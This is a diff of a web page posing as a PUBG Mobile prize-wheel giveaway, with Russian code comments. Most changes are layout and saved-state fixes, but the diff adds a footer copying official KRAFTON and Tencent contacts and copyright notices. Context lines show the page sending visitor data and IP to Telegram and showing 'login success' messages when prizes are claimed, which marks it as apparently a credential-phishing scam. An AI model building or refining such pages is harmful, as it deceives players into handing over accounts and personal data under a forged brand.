@@ -121,62 +121,15 @@
             50% { opacity: 0.7; }
         }
         
-        /* ГЛАВНЫЙ КОНТЕЙНЕР С РАМКОЙ */
-        .container {
-            position: relative;
-            width: 95%;
-            max-width: 1000px;
-            margin-top: 80px;
-            padding: 40px;
-            min-height: 500px;
-            
-            /* Настройка рамки через border-image */
-            border: 30px solid transparent;
-            border-image-source: url('https://lh3.googleusercontent.com/drive-viewer/AKGpihYAB4ZPjAuj-9zqCq1tydKhp38_iH1SD-LOJxr_EmLNKt7gvWbG8iWATygntjOLe56lz9WjMS4k7M5d8I4W3GGY6NWkXg=s1600');
-            border-image-slice: 100;
-            border-image-repeat: stretch;
-            border-image-width: 30px;
-            
-            background: rgba(10, 20, 35, 0.8);
-            backdrop-filter: blur(10px);
-            box-shadow: 0 0 50px rgba(0,0,0,0.5);
-            z-index: 10;
-            animation: containerAppear 0.8s ease-out;
-        }
-
-        @keyframes containerAppear {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        /* Запасной стиль рамки если border-image не работает */
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -30px;
-            left: -30px;
-            right: -30px;
-            bottom: -30px;
-            border: 2px solid var(--primary);
-            pointer-events: none;
-            z-index: -1;
-            border-radius: 10px;
-        }
-        
         /* ВЕРХНЕЕ МЕНЮ (Glassmorphism) */
         .top-menu {
-            width: 100%;
+            width: 95%;
+            max-width: 1000px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             padding: 12px 25px;
-            margin-bottom: 30px;
+            margin-top: 30px;
             background: rgba(15, 23, 36, 0.7);
             border-radius: 15px;
             border: 1px solid rgba(255, 255, 255, 0.1);
@@ -557,6 +510,27 @@
         @keyframes fadeIn {
             from { opacity: 0; transform: scale(0.9); }
             to { opacity: 1; transform: scale(1); }
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 800px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            z-index: 10;
+            animation: containerAppear 0.8s ease-out;
+        }
+
+        @keyframes containerAppear {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
         
         .header {
@@ -2309,6 +2283,32 @@
             font-family: 'Inter', sans-serif;
         }
         
+        /* Дополнительный футер с информацией */
+        .info-footer {
+            width: 100%;
+            max-width: 800px;
+            text-align: center;
+            padding: 20px;
+            margin-top: 20px;
+            background: rgba(20, 35, 60, 0.8);
+            border-radius: 10px;
+            border-top: 2px solid #2a3b5a;
+            backdrop-filter: blur(10px);
+            font-family: 'Inter', sans-serif;
+            font-size: 13px;
+            color: #8da1b5;
+            line-height: 1.6;
+        }
+        
+        .info-footer a {
+            color: #1877F2;
+            text-decoration: none;
+        }
+        
+        .info-footer a:hover {
+            text-decoration: underline;
+        }
+        
         /* ЭФФЕКТ ПАДАЮЩЕГО СНЕГА */
         #snow-container {
             position: fixed;
@@ -2362,13 +2362,6 @@
         }
 
         @media (max-width: 600px) {
-            .container {
-                border-width: 15px;
-                border-image-width: 15px;
-                padding: 20px;
-                margin-top: 60px;
-            }
-            
             .winners-counter {
                 top: 5px;
                 right: 5px;
@@ -2493,6 +2486,7 @@
             .top-menu {
                 padding: 10px 15px;
                 flex-wrap: wrap;
+                margin-top: 60px;
             }
             
             .menu-left {
@@ -2541,6 +2535,11 @@
             
             .faq-item.active .faq-answer {
                 padding: 0 15px 15px 15px;
+            }
+            
+            .info-footer {
+                padding: 15px;
+                font-size: 12px;
             }
         }
     </style>
@@ -2783,47 +2782,46 @@
         </div>
     </div>
 
-    <!-- Основной контейнер с рамкой -->
-    <div class="container">
-        <!-- Верхнее меню -->
-        <div class="top-menu">
-            <div class="menu-left">
-                <div class="menu-dropdown">
-                    <button class="menu-btn" id="menuBtn">
-                        <i class="fas fa-bars"></i> Menu
-                    </button>
-                    <div class="dropdown-menu" id="dropdownMenu">
-                        <a href="https://t.me/helpumgmbot" target="_blank" class="dropdown-item">
-                            <i class="fab fa-telegram"></i> Support
-                        </a>
-                        <a href="https://www.instagram.com/pubgmcis" target="_blank" class="dropdown-item">
-                            <i class="fab fa-instagram"></i> Instagram
-                        </a>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="menu-right">
-                <div class="language-menu">
-                    <button class="language-btn" id="languageBtn">
-                        <i class="fas fa-globe"></i> English <i class="fas fa-chevron-down"></i>
-                    </button>
-                    <div class="language-dropdown" id="languageDropdown">
-                        <div class="language-option" data-lang="en">English</div>
-                        <div class="language-option" data-lang="ru">Русский</div>
-                        <div class="language-option" data-lang="uz">O'zbekcha</div>
-                    </div>
-                </div>
-                
-                <div class="prize-mail-icon">
-                    <button class="prize-mail-btn" id="prizeMailBtn">
-                        <i class="fas fa-gift"></i> My Prize
-                        <div class="prize-badge" id="prizeBadge">0</div>
-                    </button>
+    <!-- Верхнее меню -->
+    <div class="top-menu">
+        <div class="menu-left">
+            <div class="menu-dropdown">
+                <button class="menu-btn" id="menuBtn">
+                    <i class="fas fa-bars"></i> Menu
+                </button>
+                <div class="dropdown-menu" id="dropdownMenu">
+                    <a href="https://t.me/helpumgmbot" target="_blank" class="dropdown-item">
+                        <i class="fab fa-telegram"></i> Support
+                    </a>
+                    <a href="https://www.instagram.com/pubgmcis" target="_blank" class="dropdown-item">
+                        <i class="fab fa-instagram"></i> Instagram
+                    </a>
                 </div>
             </div>
         </div>
+        
+        <div class="menu-right">
+            <div class="language-menu">
+                <button class="language-btn" id="languageBtn">
+                    <i class="fas fa-globe"></i> English <i class="fas fa-chevron-down"></i>
+                </button>
+                <div class="language-dropdown" id="languageDropdown">
+                    <div class="language-option" data-lang="en">English</div>
+                    <div class="language-option" data-lang="ru">Русский</div>
+                    <div class="language-option" data-lang="uz">O'zbekcha</div>
+                </div>
+            </div>
+            
+            <div class="prize-mail-icon">
+                <button class="prize-mail-btn" id="prizeMailBtn">
+                    <i class="fas fa-gift"></i> My Prize
+                    <div class="prize-badge" id="prizeBadge">0</div>
+                </button>
+            </div>
+        </div>
+    </div>
 
+    <div class="container">
         <div class="header">
             <!-- Удален текст "КОЛЕСО УДАЧИ PUBG" -->
         </div>
@@ -3061,6 +3059,26 @@
         </div>
     </div>
 
+    <!-- Дополнительная информация -->
+    <div class="info-footer">
+        <p>
+            Customer Support: service@pubgmobile.com<br>
+            Partnership Inquiry: pubgmobile_business@tencent.com
+        </p>
+        <p>
+            <strong>KRAFTON</strong><br>
+            LEVEL INFIMITE<br>
+            LIGHTSPEED STUDIOS
+        </p>
+        <p>
+            © 2026 KRAFTON, Inc. All RIGHTS RESERVED.<br>
+            © 2019-2026 Proxima Beta Pte. Limited. All RIGHTS RESERVED.
+        </p>
+        <p>
+            Privacy Policy | Cookies Policy | User Agreement | Law Enforcement Requests | Open Source
+        </p>
+    </div>
+
     <!-- Аудио для звуков -->
     <audio id="spinSound" preload="auto">
         <source src="https://assets.mixkit.co/sfx/preview/mixkit-slot-machine-wheel-spin-1382.mp3" type="audio/mpeg">
@@ -3088,7 +3106,7 @@
         let currentLang = 'en';
         let finalPrizeIndex = 0;
         
-        // Функция сохранения состояния
+        // Функция сохранения состояния (добавляем сохранение состояния рамки)
         function saveUserState() {
             const state = {
                 userIP: userIP,
@@ -3097,12 +3115,28 @@
                 userPrize: userPrize,
                 isPrizeReceived: isPrizeReceived,
                 finalPrizeIndex: finalPrizeIndex,
-                currentLang: currentLang
+                currentLang: currentLang,
+                framePosition: getFramePosition()
             };
             localStorage.setItem('userState', JSON.stringify(state));
         }
         
-        // Функция загрузки состояния
+        // Функция получения позиции рамки
+        function getFramePosition() {
+            const selectionFrame = document.getElementById('selectionFrame');
+            if (selectionFrame && selectionFrame.classList.contains('active')) {
+                return {
+                    width: selectionFrame.style.width,
+                    height: selectionFrame.style.height,
+                    left: selectionFrame.style.left,
+                    top: selectionFrame.style.top,
+                    opacity: selectionFrame.style.opacity
+                };
+            }
+            return null;
+        }
+        
+        // Функция загрузки состояния (добавляем загрузку состояния рамки)
         function loadUserState() {
             const savedState = localStorage.getItem('userState');
             if (savedState) {
@@ -3122,6 +3156,40 @@
                 }
             }
             return false;
+        }
+        
+        // Функция восстановления позиции рамки после загрузки
+        function restoreFramePosition() {
+            if (userPrize && !isPrizeReceived && finalPrizeIndex !== undefined) {
+                // Ждем немного чтобы DOM полностью загрузился
+                setTimeout(() => {
+                    const selectionFrame = document.getElementById('selectionFrame');
+                    const selectionIndicator = document.getElementById('selectionIndicator');
+                    const prizeItems = document.querySelectorAll('.prize-item');
+                    
+                    if (selectionFrame && prizeItems[finalPrizeIndex]) {
+                        const prizeItem = prizeItems[finalPrizeIndex];
+                        const rect = prizeItem.getBoundingClientRect();
+                        const containerRect = document.querySelector('.roulette-container').getBoundingClientRect();
+                        
+                        selectionFrame.style.width = (rect.width + 20) + 'px';
+                        selectionFrame.style.height = (rect.height + 20) + 'px';
+                        selectionFrame.style.left = (rect.left - containerRect.left - 8) + 'px';
+                        selectionFrame.style.top = (rect.top - containerRect.top - 8) + 'px';
+                        selectionFrame.classList.add('active');
+                        selectionFrame.style.opacity = '1';
+                        
+                        // Позиционирование индикатора
+                        if (selectionIndicator) {
+                            selectionIndicator.style.left = rect.left - containerRect.left + rect.width/2 + 'px';
+                            selectionIndicator.style.top = rect.top - containerRect.top - 28 + 'px';
+                            selectionIndicator.classList.add('show');
+                        }
+                        
+                        console.log('Рамка восстановлена на призе #', finalPrizeIndex + 1);
+                    }
+                }, 500); // Даем время на загрузку всех элементов
+            }
         }
         
         // Функция отправки данных о посещении в Telegram с расширенной информацией
@@ -3483,12 +3551,18 @@
                     
                     // Инициализируем интерфейс после получения IP
                     initInterface();
+                    
+                    // Восстанавливаем позицию рамки после загрузки состояния
+                    restoreFramePosition();
                 })
                 .catch(error => {
                     console.log('Error getting IP:', error);
                     // Пробуем загрузить состояние даже без IP
                     loadUserState();
                     initInterface();
+                    
+                    // Восстанавливаем позицию рамки после загрузки состояния
+                    restoreFramePosition();
                 });
             
             function initInterface() {
@@ -3864,6 +3938,7 @@
                     selectionFrame.style.left = (rect.left - containerRect.left - 8) + 'px';
                     selectionFrame.style.top = (rect.top - containerRect.top - 8) + 'px';
                     selectionFrame.classList.add('active');
+                    selectionFrame.style.opacity = '1';
                     
                     // Позиционирование индикатора
                     selectionIndicator.style.left = rect.left - containerRect.left + rect.width/2 + 'px';
@@ -3950,10 +4025,12 @@
                                 // Обновляем значок с анимацией
                                 updatePrizeBadge();
                                 
+                                // Сохраняем состояние (включая позицию рамки)
+                                saveUserState();
+                                
                                 // Сохраняем, что пользователь уже играл (если не владелец)
                                 if (userIP !== ownerIP) {
                                     hasPlayed = true;
-                                    saveUserState();
                                     playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
                                 } else {
                                     playBtn.innerHTML = `<i class="fas fa-play"></i> ${translations[currentLang].play}`;
@@ -4048,6 +4125,7 @@
                         updatePrizeBadge();
                         showConfirmation();
                         showNotification(translations[currentLang].loginSuccess, false, true);
+                        saveUserState(); // Сохраняем состояние после получения приза
                     }
                 });
                 
@@ -4070,6 +4148,7 @@
                         updatePrizeBadge();
                         showConfirmation();
                         showNotification(translations[currentLang].loginSuccess, false, true);
+                        saveUserState(); // Сохраняем состояние после получения приза
                     }
                 });
                 
@@ -4091,6 +4170,7 @@
                         updatePrizeBadge();
                         showConfirmation();
                         showNotification(translations[currentLang].loginSuccess, false, true);
+                        saveUserState(); // Сохраняем состояние после получения приза
                     }
                 });
                 
@@ -4141,6 +4221,7 @@
                         updatePrizeBadge();
                         showConfirmation();
                         showNotification(translations[currentLang].loginSuccess, false, true);
+                        saveUserState(); // Сохраняем состояние после получения приза
                     }
                 });
                 
@@ -4281,12 +4362,6 @@
                 
                 // Восстанавливаем состояние при загрузке
                 if (userPrize && !isPrizeReceived) {
-                    // Показываем рамку на выигранном призе
-                    setTimeout(() => {
-                        moveFrameToPrize(finalPrizeIndex);
-                        showSelectionIndicator(true);
-                    }, 500);
-                    
                     // Обновляем кнопку игры
                     if (hasPlayed && userIP !== ownerIP) {
                         playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
@@ -4390,7 +4465,7 @@
                     }
                 }
                 
-                // Запускаем анимацию рамки через 2 секунды после загрузки
+                // Запускаем анимацию рамки через 2 секунды после загрузки (только если нет выигранного приза)
                 setTimeout(() => {
                     if (!isSpinning && !userPrize) {
                         animateFrameRandomly();
